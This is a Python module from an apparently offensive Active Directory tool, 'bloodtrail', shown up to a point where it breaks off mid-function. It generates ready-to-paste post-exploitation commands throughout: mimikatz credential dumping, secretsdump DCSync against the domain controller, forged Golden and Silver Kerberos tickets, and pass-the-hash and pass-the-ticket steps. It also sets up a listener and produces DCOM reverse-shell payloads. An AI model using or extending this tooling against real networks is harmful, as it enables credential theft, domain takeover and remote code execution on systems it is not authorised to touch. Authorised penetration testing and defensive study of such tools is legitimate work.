"""
Post-exploitation command display for bloodtrail.

Shows mimikatz commands, credential harvest workflows, and lateral movement techniques.
"""

from typing import List

from .base import Colors, NoColors
from .techniques import print_technique_legend
from .authenticated import print_authenticated_attacks_template


def print_post_exploit_commands(
    user_name: str,
    access: List = None,  # List[MachineAccess]
    domain_level_access: str = None,
    cred_types: List[str] = None,
    cred_values: List[str] = None,
    dc_ip: str = None,
    domain_sid: str = None,
    lhost: str = None,
    lport: int = None,
    use_colors: bool = True,
) -> None:
    """
    Display mimikatz post-exploitation recommendations based on privilege level.

    Shows credential harvest order with copy-paste ready commands,
    educational tips for what to look for, and next steps after harvesting.

    Args:
        user_name: User UPN (USER@DOMAIN.COM)
        access: List of MachineAccess objects
        domain_level_access: 'domain-admin' if user has DA-level rights
        cred_types: List of credential types the user has
        cred_values: List of corresponding credential values
        dc_ip: Domain Controller IP address
        domain_sid: Domain SID for Golden/Silver ticket (e.g., S-1-5-21-...)
        use_colors: Enable ANSI colors
    """
    from ..mappings.post_exploit import (
        get_post_exploit_commands,
        get_harvest_tips,
        get_arg_acquisition,
    )
    from ..mappings.edge_mappings import CRED_TYPE_TEMPLATES
    from ..mappings.command_fill import fill_pwned_command
    from ..mappings.text_utils import infer_dc_hostname

    c = Colors if use_colors else NoColors
    access = access or []
    cred_types = cred_types or ["password"]

    # Extract username and domain
    if "@" in user_name:
        username, domain = user_name.split("@")
    else:
        username = user_name
        domain = ""

    # Determine DC target
    dc_target = dc_ip or infer_dc_hostname(domain)

    # Group access by privilege level
    local_admin_targets = [a for a in access if a.privilege_level == "local-admin"]
    session_targets = [a for a in local_admin_targets if a.sessions]

    # Header
    print()
    print(f"{c.CYAN}{'‚ïê'*75}{c.RESET}")
    print(f"  {c.BOLD}POST-EXPLOITATION COMMANDS{c.RESET} ({c.YELLOW}{user_name}{c.RESET})")
    print(f"{c.CYAN}{'‚ïê'*75}{c.RESET}")

    # STORED CREDENTIALS
    if cred_types and cred_values:
        print()
        print(f"  {c.BOLD}STORED CREDENTIALS{c.RESET}")
        print(f"  {c.DIM}{'‚îÄ'*70}{c.RESET}")
        for ctype, cval in zip(cred_types, cred_values):
            if cval and cval not in ("<PASSWORD>", "<HASH>", "<TICKET_PATH>"):
                ctype_display = ctype.replace("-", " ").title()
                print(f"    {c.DIM}{ctype_display}:{c.RESET}  {c.GREEN}{cval}{c.RESET}")

    # PRIVILEGE ESCALATION PHASE
    if domain_level_access:
        print()
        print(f"  {c.BOLD}{c.CYAN}{'‚îÄ'*70}")
        print(f"  PRIVILEGE ESCALATION")
        print(f"  {'‚îÄ'*70}{c.RESET}")
        print()
        print(f"  {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [DCSync] (Priority: 199)")
        print(f"  {c.DIM}{'‚îÄ'*70}{c.RESET}")

        # DCSync - remote preferred
        da_commands = get_post_exploit_commands("domain-admin", "remote_preferred")
        print(f"\n  {c.CYAN}DCSync (remote - safer):{c.RESET}")

        for cmd_tuple in da_commands:
            description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""
            template = "impacket-secretsdump -just-dc '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>"
            if cred_types and cred_types[0] == "ntlm-hash":
                template = "impacket-secretsdump -just-dc -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>"
            cmd = template.replace("<USERNAME>", username).replace("<DOMAIN>", domain.lower())
            cmd = cmd.replace("<DC_IP>", dc_target)
            cmd = cmd.replace("<CRED_VALUE>", "<PASSWORD>" if not cred_types or cred_types[0] == "password" else "<HASH>")
            print(f"    {c.GREEN}{cmd}{c.RESET}")
            print(f"    {c.DIM}‚Üí {description}{c.RESET}")

        # Golden Ticket (after obtaining krbtgt hash)
        print(f"\n  {c.CYAN}Golden Ticket (after obtaining krbtgt hash):{c.RESET}")
        sid_value = domain_sid if domain_sid else "<SID>"
        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /user:{username} /domain:{domain.lower()} /sid:{sid_value} /krbtgt:<KRBTGT_HASH> /ptt\"{c.RESET}")

        # Arg acquisition for Golden Ticket
        missing_args = ["<KRBTGT_HASH>"]
        if not domain_sid:
            missing_args.insert(0, "<SID>")
        _print_arg_acquisition(missing_args, c)

    # ON-TARGET ACTIONS (Post-Landing)
    if local_admin_targets:
        print()
        print(f"  {c.BOLD}{c.CYAN}{'‚îÄ'*70}")
        print(f"  ON-TARGET ACTIONS")
        print(f"  {'‚îÄ'*70}{c.RESET}")
        print()
        print(f"  {c.RED}{c.BOLD}CREDENTIAL HARVESTING{c.RESET} ({len(local_admin_targets)} machines with local admin)")
        print(f"  {c.DIM}{'‚îÄ'*70}{c.RESET}")

        # Priority targets with sessions
        if session_targets:
            print()
            print(f"  {c.YELLOW}‚òÖ PRIORITY TARGETS (Privileged Sessions Detected) ‚òÖ{c.RESET}")
            for target in session_targets[:5]:
                sessions_str = ", ".join(target.sessions[:3])
                print(f"    {c.BOLD}{target.computer}{c.RESET}: Sessions from {c.YELLOW}{sessions_str}{c.RESET}")
                print(f"      {c.DIM}‚Üí Run sekurlsa::logonpasswords to harvest these credentials!{c.RESET}")

        # Credential harvest order
        print()
        print(f"  {c.CYAN}CREDENTIAL HARVEST ORDER:{c.RESET}")
        print()

        harvest_commands = get_post_exploit_commands("local-admin", "credential_harvest")

        # Table header
        print(f"    {'#':<3} {'Command (copy-paste ready)':<62} {'Priority':<8}")
        print(f"    {'‚îÄ'*3} {'‚îÄ'*62} {'‚îÄ'*8}")

        for idx, cmd_tuple in enumerate(harvest_commands, 1):
            cmd_id = cmd_tuple[0]
            module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_id
            priority = cmd_tuple[3] if len(cmd_tuple) > 3 else "medium"

            mimi_cmd = f'mimikatz.exe "privilege::debug" "{module}" "exit"'

            priority_color = c.RED if priority == "high" else (c.YELLOW if priority == "medium" else c.DIM)
            print(f"    {idx:<3} {c.GREEN}{mimi_cmd:<62}{c.RESET} {priority_color}{priority.upper():<8}{c.RESET}")

        # Educational tips
        _print_harvest_tips("sekurlsa::logonpasswords", c)
        _print_harvest_tips("sekurlsa::tickets", c)
        _print_harvest_tips("lsadump::sam", c)
        _print_harvest_tips("lsadump::secrets", c)

        # With harvested hash section
        print()
        print(f"  {c.CYAN}WITH HARVESTED NTLM HASH:{c.RESET}")
        print()

        # Overpass-the-Hash
        print(f"    {c.DIM}# Overpass-the-Hash (NTLM ‚Üí Kerberos ticket):{c.RESET}")
        print(f"    {c.GREEN}mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe\"{c.RESET}")
        print()
        print(f"    {c.YELLOW}‚ö† IMPORTANT: Use HOSTNAME not IP after Overpass-the-Hash!{c.RESET}")
        print(f"      {c.GREEN}‚úì dir \\\\DC01\\C${c.RESET}  {c.DIM}(Kerberos - uses ticket){c.RESET}")
        print(f"      {c.RED}‚úó dir \\\\10.0.0.1\\C${c.RESET}  {c.DIM}(NTLM - bypasses ticket!){c.RESET}")

        # Silver Ticket
        print()
        print(f"    {c.DIM}# Silver Ticket (requires service account hash):{c.RESET}")
        first_target = local_admin_targets[0].computer if local_admin_targets else "TARGET.DOMAIN.COM"
        sid_value = domain_sid if domain_sid else "<SID>"
        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /domain:{domain.lower()} /sid:{sid_value} /target:{first_target.lower()} /service:cifs /rc4:<SERVICE_HASH> /user:{username} /ptt\"{c.RESET}")

        # Arg acquisition for Silver Ticket
        missing_args = ["<SERVICE_HASH>", "<TARGET_SPN>"]
        if not domain_sid:
            missing_args.insert(0, "<SID>")
        _print_arg_acquisition(missing_args, c)

        # Pass-the-Ticket workflow
        target_hostnames = [t.computer for t in local_admin_targets[:3]]
        ptt_console, _ = _generate_ptt_workflow(target_hostnames, domain, c)
        for line in ptt_console:
            print(line)

        # DCOM lateral movement workflow
        target_ips = [t.ip if hasattr(t, 'ip') and t.ip else t.computer for t in local_admin_targets[:3]]
        dcom_console, _ = _generate_dcom_workflow(target_ips, c, lhost=lhost, lport=lport)
        for line in dcom_console:
            print(line)

    # NO PRIVILEGED ACCESS
    if not local_admin_targets and not domain_level_access:
        print()
        print(f"  {c.DIM}No local-admin or domain-admin access detected.{c.RESET}")
        print(f"  {c.DIM}Post-exploitation commands require elevated privileges.{c.RESET}")

        user_commands = get_post_exploit_commands("user-level", "limited")
        if user_commands:
            print()
            print(f"  {c.CYAN}LIMITED OPTIONS (User-Level):{c.RESET}")
            for cmd_tuple in user_commands:
                description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""
                module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_tuple[0]
                print(f"    {c.GREEN}mimikatz.exe \"{module}\"{c.RESET}")
                print(f"    {c.DIM}‚Üí {description}{c.RESET}")

    print()
    print(f"{c.CYAN}{'‚ïê'*75}{c.RESET}")


def print_pwned_followup_commands(
    user_name: str,
    cred_type: str = None,
    cred_value: str = None,
    access: List = None,
    domain_level_access: str = None,
    use_colors: bool = True,
    cred_types: List[str] = None,
    cred_values: List[str] = None,
    dc_ip: str = None,
    dc_hostname: str = None,
    domain_sid: str = None,
) -> None:
    """
    Print follow-up commands after marking a user as pwned.

    Commands are auto-filled with stored credential values.
    Shows ALL available techniques per target for easy copy-paste.
    Supports multiple credential types per user.
    """
    from ..mappings.edge_mappings import CRED_TYPE_TEMPLATES
    from ..mappings.lateral import LATERAL_TECHNIQUES, get_techniques_for_access
    from ..mappings.command_fill import fill_pwned_command
    from ..mappings.text_utils import infer_dc_hostname

    c = Colors if use_colors else NoColors
    access = access or []

    # Handle backward compatibility
    if cred_types is None:
        cred_types = [cred_type] if cred_type else ["password"]
    if cred_values is None:
        cred_values = [cred_value] if cred_value else [""]

    # Extract username and domain
    if "@" in user_name:
        username, domain = user_name.split("@")
    else:
        username = user_name
        domain = ""

    primary_cred_type = cred_types[0] if cred_types else "password"
    primary_cred_value = cred_values[0] if cred_values else ""
    dc_target = dc_hostname or dc_ip or infer_dc_hostname(domain)

    # Header
    print()
    print(f"{c.BOLD}{'='*70}{c.RESET}")
    print(f"  {c.CYAN}FOLLOW-UP COMMANDS{c.RESET} ({c.BOLD}{user_name}{c.RESET})")
    print(f"{'='*70}")

    # Show all credentials
    if len(cred_types) > 1:
        creds_display = ", ".join(f"{c.YELLOW}{ct}{c.RESET}" for ct in cred_types)
        print(f"  Credentials: {creds_display}")
    else:
        print(f"  Credential: {c.YELLOW}{primary_cred_type}{c.RESET} (stored - auto-filled)")
    print()

    # PRIVILEGE ESCALATION PHASE
    if domain_level_access == "domain-admin":
        print(f"{c.BOLD}{c.CYAN}{'='*70}")
        print(f"  PRIVILEGE ESCALATION")
        print(f"{'='*70}{c.RESET}")
        print()
        print(f"üëë {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [DCSync] (Priority: 199)")
        print()
        print(f"  {'Attack':<22} {'Reason':<40} {'Ready Command'}")
        print(f"  {'-'*22} {'-'*40} {'-'*60}")
        template = CRED_TYPE_TEMPLATES.get(primary_cred_type, {}).get("DCSync")
        if template:
            cmd = fill_pwned_command(
                template,
                username=username,
                domain=domain,
                target=dc_target,
                cred_value=primary_cred_value,
                dc_ip=dc_ip
            )
            print(
                f"  {c.BOLD}{'DCSync':<22}{c.RESET} "
                f"{c.YELLOW}{'Member of Domain Admins':<40}{c.RESET} "
                f"{c.GREEN}{cmd}{c.RESET}"
            )
        print()

    # Group access by privilege level
    admin_access = [a for a in access if a.privilege_level == "local-admin"]
    user_access = [a for a in access if a.privilege_level == "user-level"]
    dcom_access = [a for a in access if a.privilege_level == "dcom-exec"]

    CRED_TYPE_LABELS = {
        "password": "password",
        "ntlm-hash": "ntlm-hash (Pass-the-Hash)",
        "kerberos-ticket": "kerberos-ticket (Pass-the-Ticket)",
        "certificate": "certificate",
    }

    # LATERAL MOVEMENT PHASE
    has_lateral_access = admin_access or dcom_access or user_access
    if has_lateral_access:
        total_lateral = len(admin_access) + len(dcom_access) + len(user_access)
        print(f"\n{c.BOLD}{c.CYAN}{'='*70}")
        print(f"  LATERAL MOVEMENT ({total_lateral} targets)")
        print(f"{'='*70}{c.RESET}")

    # Local Admin access
    if admin_access:
        print()
        print(f"ü©∏ {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(admin_access)} machines) [AdminTo] (Priority: 99)")

        priority_targets = []
        techniques = get_techniques_for_access("AdminTo")

        for cred_idx, (ct, cv) in enumerate(zip(cred_types, cred_values)):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()

            for ma in admin_access[:10]:
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")
                for tech in techniques:
                    template = tech.command_templates.get(ct)
                    if template:
                        cmd = fill_pwned_command(
                            template,
                            username=username,
                            domain=domain,
                            target=ma.computer,
                            cred_value=cv,
                            target_ip=ma.computer_ip or ""
                        )
                        tech_short = tech.name.split()[0].lower()
                        print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")

                if cred_idx == 0 and ma.sessions:
                    priority_targets.append((ma, ma.sessions))
                print()

            if len(admin_access) > 10:
                print(f"  {c.DIM}... and {len(admin_access) - 10} more machines{c.RESET}")

        # Priority targets with sessions
        if priority_targets:
            print()
            print(f"  {c.YELLOW}‚ö† PRIORITY TARGETS (privileged sessions detected){c.RESET}")
            print()
            for ma, sessions in priority_targets[:5]:
                sessions_str = ", ".join(sessions[:2])
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")
                print(f"    {c.YELLOW}Sessions: {sessions_str}{c.RESET}")
                for ct, cv in zip(cred_types, cred_values):
                    sd_template = CRED_TYPE_TEMPLATES.get(ct, {}).get("secretsdump")
                    if sd_template:
                        sd_cmd = fill_pwned_command(sd_template, username, domain, ma.computer, cv, ma.computer_ip or "")
                        label_short = "PtH" if ct == "ntlm-hash" else ct[:4]
                        print(f"    {c.DIM}secretsdump ({label_short}):{c.RESET}  {c.GREEN}{sd_cmd}{c.RESET}")
                print()

        print_technique_legend(techniques, c)

    # DCOM access
    if dcom_access:
        print(f"\n‚öôÔ∏è  {c.BLUE}{c.BOLD}DCOM ACCESS{c.RESET} ({len(dcom_access)} machines) [ExecuteDCOM] (Priority: 90)")
        techniques = get_techniques_for_access("ExecuteDCOM")
        for ct, cv in zip(cred_types, cred_values):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()
            for ma in dcom_access[:5]:
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")
                for tech in techniques:
                    template = tech.command_templates.get(ct)
                    if template:
                        cmd = fill_pwned_command(template, username, domain, ma.computer, cv, ma.computer_ip or "")
                        tech_short = tech.name.split()[0].lower()
                        print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                print()

    # User-level access
    if user_access:
        print(f"\nüîµ {c.BLUE}{c.BOLD}USER-LEVEL ACCESS{c.RESET} ({len(user_access)} machines) [CanPSRemote/CanRDP] (Priority: 65-85)")
        for ct, cv in zip(cred_types, cred_values):
            print()
            label = CRED_TYPE_LABELS.get(ct, ct)
            print(f"  {c.CYAN}Using: {label}{c.RESET}")
            print()
            for ma in user_access[:10]:
                print(f"  {c.BOLD}{ma.computer}{c.RESET}")
                for access_type in ma.access_types:
                    if access_type in ("CanRDP", "CanPSRemote"):
                        techniques = get_techniques_for_access(access_type)
                        for tech in techniques:
                            template = tech.command_templates.get(ct)
                            if template:
                                cmd = fill_pwned_command(template, username, domain, ma.computer, cv, ma.computer_ip or "")
                                tech_short = tech.name.split()[0].lower()
                                print(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                print()
            if len(user_access) > 10:
                print(f"  {c.DIM}... and {len(user_access) - 10} more machines{c.RESET}")

    # No edge-based access
    if not admin_access and not user_access and not dcom_access and not domain_level_access:
        print(f"  {c.DIM}No direct machine access via AdminTo/CanRDP/CanPSRemote edges.{c.RESET}")
        print()

    print(f"{'='*70}")

    # Auto-show post-exploitation commands
    has_local_admin = any(a.privilege_level == "local-admin" for a in access)
    if has_local_admin or domain_level_access:
        print_post_exploit_commands(
            user_name=user_name,
            access=access,
            domain_level_access=domain_level_access,
            cred_types=cred_types,
            cred_values=cred_values,
            dc_ip=dc_ip,
            domain_sid=domain_sid,
            use_colors=use_colors,
        )

    # Show authenticated attacks
    print_authenticated_attacks_template(use_colors=use_colors, dc_ip=dc_ip)


def _print_harvest_tips(technique: str, c) -> None:
    """Print educational tips for a specific harvest technique."""
    from ..mappings.post_exploit import get_harvest_tips

    tips = get_harvest_tips(technique)

    if not tips.get("what_to_look_for") and not tips.get("next_steps"):
        return

    print()
    print(f"    {c.DIM}‚îå‚îÄ {technique} ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê{c.RESET}")

    if tips.get("what_to_look_for"):
        print(f"    {c.DIM}‚îÇ{c.RESET} {c.BOLD}WHAT TO LOOK FOR:{c.RESET}")
        for item in tips["what_to_look_for"][:4]:
            print(f"    {c.DIM}‚îÇ{c.RESET}   ‚Ä¢ {item}")

    if tips.get("next_steps"):
        print(f"    {c.DIM}‚îÇ{c.RESET}")
        print(f"    {c.DIM}‚îÇ{c.RESET} {c.BOLD}NEXT STEPS:{c.RESET}")
        for item in tips["next_steps"][:4]:
            print(f"    {c.DIM}‚îÇ{c.RESET}   ‚Ä¢ {c.GREEN}{item}{c.RESET}")

    print(f"    {c.DIM}‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò{c.RESET}")


def _print_arg_acquisition(placeholders: List[str], c) -> None:
    """Print arg acquisition hints for critical placeholders."""
    from ..mappings.post_exploit import get_arg_acquisition

    print()
    print(f"    {c.DIM}‚îå‚îÄ ARG ACQUISITION ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê{c.RESET}")

    for ph in placeholders:
        arg_info = get_arg_acquisition(ph)
        if not arg_info:
            continue

        print(f"    {c.DIM}‚îÇ{c.RESET} {c.BOLD}{ph}{c.RESET} - {arg_info.get('description', '')}")

        quick_cmds = arg_info.get("quick_commands", [])
        for cmd in quick_cmds[:2]:
            print(f"    {c.DIM}‚îÇ{c.RESET}   ‚Üí {c.GREEN}{cmd}{c.RESET}")

        if arg_info.get("requires"):
            print(f"    {c.DIM}‚îÇ{c.RESET}   {c.YELLOW}Requires: {arg_info['requires']}{c.RESET}")

        if arg_info.get("example"):
            print(f"    {c.DIM}‚îÇ{c.RESET}   {c.DIM}Example: {arg_info['example']}{c.RESET}")

        print(f"    {c.DIM}‚îÇ{c.RESET}")

    print(f"    {c.DIM}‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò{c.RESET}")


def _generate_ptt_workflow(targets: List[str], domain: str, c) -> tuple:
    """Generate Pass-the-Ticket workflow section."""
    from ..mappings.post_exploit import PTT_WORKFLOW

    console_lines = []
    markdown_lines = []

    target = targets[0].split('.')[0] if targets else "TARGET"
    fqdn = f"{target}.{domain.lower()}" if domain else f"{target}.domain.com"

    # Header
    console_lines.append("")
    console_lines.append(f"  {c.CYAN}{c.BOLD}PASS-THE-TICKET WORKFLOW{c.RESET}")
    console_lines.append(f"  {c.DIM}{'‚îÄ'*66}{c.RESET}")

    markdown_lines.append("#### Pass-the-Ticket Workflow")
    markdown_lines.append("")

    # Export
    export = PTT_WORKFLOW["export"]
    console_lines.append(f"\n  {c.BOLD}{export['title']}{c.RESET}")
    console_lines.append(f"    {c.GREEN}{export['command']}{c.RESET}")
    for note in export["notes"]:
        console_lines.append(f"    {c.DIM}‚Üí {note}{c.RESET}")

    markdown_lines.append(f"**{export['title']}**")
    markdown_lines.append(f"```")
    markdown_lines.append(export['command'])
    markdown_lines.append(f"```")
    markdown_lines.append("- " + "\n- ".join(export["notes"]))
    markdown_lines.append("")

    # Identify
    identify = PTT_WORKFLOW["identify"]
    console_lines.append(f"\n  {c.BOLD}{identify['title']}{c.RESET}")
    for pattern, desc, priority in identify["priority_order"]:
        prio_color = c.RED if priority == "HIGHEST" else (c.YELLOW if priority == "HIGH" else c.DIM)
        console_lines.append(f"    {prio_color}[{priority}]{c.RESET} {pattern} - {desc}")

    markdown_lines.append(f"**{identify['title']}**")
    markdown_lines.append("| Priority | Pattern | Description |")
    markdown_lines.append("|----------|---------|-------------|")
    for pattern, desc, priority in identify["priority_order"]:
        markdown_lines.append(f"| {priority} | `{pattern}` | {desc} |")
    markdown_lines.append("")

    # Import Windows
    imp_win = PTT_WORKFLOW["import_windows"]
    console_lines.append(f"\n  {c.BOLD}{imp_win['title']}{c.RESET}")
    for label, cmd in imp_win["commands"]:
        console_lines.append(f"    {c.DIM}{label}:{c.RESET} {c.GREEN}{cmd}{c.RESET}")

    markdown_lines.append(f"**{imp_win['title']}**")
    markdown_lines.append("```")
    for label, cmd in imp_win["commands"]:
        markdown_lines.append(f"# {label}")
        markdown_lines.append(cmd)
    markdown_lines.append("```")
    markdown_lines.append("")

    # Import Linux
    imp_lin = PTT_WORKFLOW["import_linux"]
    console_lines.append(f"\n  {c.BOLD}{imp_lin['title']}{c.RESET}")
    for label, cmd in imp_lin["commands"]:
        console_lines.append(f"    {c.DIM}{label}:{c.RESET} {c.GREEN}{cmd}{c.RESET}")

    markdown_lines.append(f"**{imp_lin['title']}**")
    markdown_lines.append("```bash")
    for label, cmd in imp_lin["commands"]:
        markdown_lines.append(f"# {label}")
        markdown_lines.append(cmd)
    markdown_lines.append("```")
    markdown_lines.append("")

    # Capitalize
    cap = PTT_WORKFLOW["capitalize"]
    console_lines.append(f"\n  {c.BOLD}{cap['title']}{c.RESET}")
    console_lines.append(f"    {c.RED}{c.BOLD}‚ö†Ô∏è {cap['critical_warning']}{c.RESET}")
    console_lines.append(f"\n    {c.CYAN}Windows:{c.RESET}")
    for label, cmd in cap["windows_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target)
        console_lines.append(f"      {c.DIM}{label}:{c.RESET} {c.GREEN}{filled_cmd}{c.RESET}")
    console_lines.append(f"\n    {c.CYAN}Kali:{c.RESET}")
    for label, cmd in cap["linux_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target).replace("<USER>", "user")
        console_lines.append(f"      {c.DIM}{label}:{c.RESET} {c.GREEN}{filled_cmd}{c.RESET}")

    console_lines.append(f"\n    {c.GREEN}‚úì {cap['examples']['correct']}{c.RESET}")
    console_lines.append(f"    {c.RED}‚úó {cap['examples']['wrong']}{c.RESET}")

    markdown_lines.append(f"**{cap['title']}**")
    markdown_lines.append(f"> ‚ö†Ô∏è **{cap['critical_warning']}**")
    markdown_lines.append("")
    markdown_lines.append("**Windows:**")
    markdown_lines.append("```cmd")
    for label, cmd in cap["windows_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target)
        markdown_lines.append(f"{filled_cmd}")
    markdown_lines.append("```")
    markdown_lines.append("")
    markdown_lines.append("**Kali:**")
    markdown_lines.append("```bash")
    for label, cmd in cap["linux_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target).replace("<USER>", "user")
        markdown_lines.append(f"{filled_cmd}")
    markdown_lines.append("```")
    markdown_lines.append("")

    # Verify
    console_lines.append(f"\n  {c.BOLD}5. VERIFY ACCESS CHANGES{c.RESET}")
    console_lines.append(f"    {c.DIM}Compare share access before/after PTT to confirm privilege escalation:{c.RESET}")
    console_lines.append(f"    {c.GREEN}crackmapexec smb {fqdn} -u <USER> -p '<PASS>' --shares{c.RESET}")
    console_lines.append(f"    {c.GREEN}crackmapexec smb {fqdn} -k --shares{c.RESET}  {c.DIM}# With Kerberos ticket{c.RESET}")

    markdown_lines.append("**5. VERIFY ACCESS CHANGES**")
    markdown_lines.append("")
    markdown_lines.append("```bash")
    markdown_lines.append(f"crackmapexec smb {fqdn} -u <USER> -p '<PASS>' --shares")
    markdown_lines.append(f"crackmapexec smb {fqdn} -k --shares  # With Kerberos ticket")
    markdown_lines.append("```")
    markdown_lines.append("")

    # Troubleshoot
    trouble = PTT_WORKFLOW["troubleshoot"]
    console_lines.append(f"\n  {c.BOLD}6. TROUBLESHOOTING{c.RESET}")
    for issue in trouble["issues"]:
        console_lines.append(f"    {c.YELLOW}‚Ä¢ {issue['problem']}{c.RESET}")
        console_lines.append(f"      {c.DIM}Fix: {issue['fix']}{c.RESET}")

    markdown_lines.append("**6. TROUBLESHOOTING**")
    markdown_lines.append("")
    for issue in trouble["issues"]:
        markdown_lines.append(f"- **{issue['problem']}**")
        markdown_lines.append(f"  - Fix: {issue['fix']}")
    markdown_lines.append("")

    return console_lines, markdown_lines


def _generate_dcom_workflow(targets: List[str], c, lhost: str = None, lport: int = None) -> tuple:
    """Generate DCOM lateral movement workflow section with auto-generated payloads."""
    from ..payload_generator import PayloadGenerator

    console_lines = []
    markdown_lines = []

    target = targets[0] if targets else "<TARGET>"
    gen = PayloadGenerator(lhost=lhost, lport=lport)

    header_suffix = f" -> {target}" if target != "<TARGET>" else ""
    console_lines.append("")
    console_lines.append(f"  {c.CYAN}{c.BOLD}DCOM LATERAL MOVEMENT (Fileless){header_suffix}{c.RESET}")
    console_lines.append(f"  {c.DIM}{'‚îÄ'*66}{c.RESET}")

    markdown_lines.append(f"#### DCOM Lateral Movement (Fileless){header_suffix}")
    markdown_lines.append("")

    if gen.is_configured:
        # Configured - show ready-to-use payloads
        console_lines.append(f"\n  {c.BOLD}0. START LISTENER{c.RESET}")
        console_lines.append(f"    {c.GREEN}{gen.get_listener_command()}{c.RESET}")

        markdown_lines.append("**0. START LISTENER**")
        markdown_lines.append("```bash")
        markdown_lines.append(gen.get_listener_command())
        markdown_lines.append("```")
        markdown_lines.append("")

        instantiate_cmd = gen.get_dcom_instantiate(target)
        console_lines.append(f"\n  {c.BOLD}1. INSTANTIATE DCOM OBJECT (run from compromised Windows){c.RESET}")
        console_lines.append(f"    {c.GREEN}{instantiate_cmd}{c.RESET}")

        markdown_lines.append("**1. INSTANTIATE DCOM OBJECT**")
        markdown_lines.append("```powershell")
        markdown_lines.append(instantiate_cmd)
        markdown_lines.append("```")
        markdown_lines.append("")

        console_lines.append(f"\n  {c.BOLD}2. EXECUTE SHELL (choose one){c.RESET}")
        markdown_lines.append("**2. EXECUTE SHELL**")
        markdown_lines.append("")

        payloads = gen.get_all_payloads(target)
        labels = ["A", "B", "C", "D"]
        for i, payload in enumerate(payloads):
            label = labels[i] if i < len(labels) else str(i + 1)
            console_lines.append(f"\n    {c.CYAN}[{label}] {payload.name}{c.RESET} {c.DIM}({payload.description}){c.RESET}")
            console_lines.append(f"    {c.GREEN}{payload.dcom_command}{c.RESET}")
            console_lines.append(f"    {c.DIM}# Unencoded:{c.RESET}")
            console_lines.append(f"    {c.DIM}{payload.payload_raw}{c.RESET}")

            markdown_lines.append(f"**[{label}] {payload.name}**")
            markdown_lines.append("```powershell")
            markdown_lines.append(payload.dcom_command)
            markdown_lines.append("```")
            markdown_lines.append("")

        console_lines.append(f"\n  {c.BOLD}TROUBLESHOOTING{c.RESET}")
